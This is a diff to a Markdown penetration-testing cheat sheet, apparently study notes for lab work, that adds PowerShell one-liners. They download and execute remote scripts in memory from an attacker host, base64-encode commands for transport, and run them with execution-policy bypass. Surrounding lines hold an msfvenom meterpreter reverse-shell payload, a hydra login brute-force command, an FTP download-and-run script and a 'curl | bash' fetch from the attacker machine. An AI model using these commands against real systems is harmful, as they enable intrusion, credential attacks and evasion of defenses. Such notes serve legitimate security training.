@@ -15,6 +15,9 @@
 * `python3 -m http.server 80` _Start a python 3 http server on port 80 in current directory_
 * `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe >m.exe` _Make a standard meterpreter exe_
 * `tcpdump -i {tun0} icmp` _Listen for ping requests.  Useful when testing RCE_
+* `$command = 'IEX(New-Object Net.WebClient).downloadString("http://{kali_ip}/script.ps1")
+[convert]::ToBase64String([System.Text.encoding]::Unicode.GetBytes($command))` _base64 encode powershell commands for easier transport to target_
+* `cmd /c powershell -exec bypass -noexit -encodedCommand {base64}` _use cmd to run the bas64 encoded command_
 
 ## Password Attacks
 * `hydra -l {username} -P {password file} {base url or ip} -s{port} http-post-form "/index.php:user=^USER^&password=^PASS^:{failed string}"`  _Brute force http post login with hydra_
@@ -29,7 +32,9 @@
 * `cmd.exe /c @echo open x.x.x.x 21>c:\users\victim\desktop\ftp.txt&@echo USER anonymous>>c:\users\victim\desktop\ftp.txt&@echo anonymous>> c:\users\victim\desktop\ftp.txt&@echo binary>>c:\users\victim\desktop\ftp.txt&@echo get met.exe>>c:\users\victim\desktop\ftp.txt&@echo quit>>c:\users\victim\desktop\ftp.txt&@ftp -v -n -s:c:\users\victim\desktop\ftp.txt&@start met.exe` _Create a scirpt to download a file via ftp, then run the script, then run the downloaded file_
 * [Next Gen Windows Exploit Suggester](https://github.com/bitsadmin/wesng)
 * [Windows enumeration script](https://github.com/411Hall/JAWS)
-* `IEX(New-Object Net.WebClient).downloadString('http://{kali_ip}/script.ps1)` _Download and exec a powershell script in memory_
+* `IEX(New-Object Net.WebClient).downloadString('http://{kali_ip}/script.ps1')` _Download and exec a powershell script in memory_
+* `powershell -exec bypass -noexit "IEX(New-Object Net.WebClient).downloadString('http://{kali_ip}/script.ps1')"` _From cmd launch powershell to download and exec script in memory_
+* `run post/multi/recon/local_exploit_suggester` _meterpreter local exploit suggester_
 
 ## Priv Esc Linux
 * `curl {kali_ip}:{port}/LinEnum.sh | /bin/bash` _Run linux enum script without dropping it on disk_
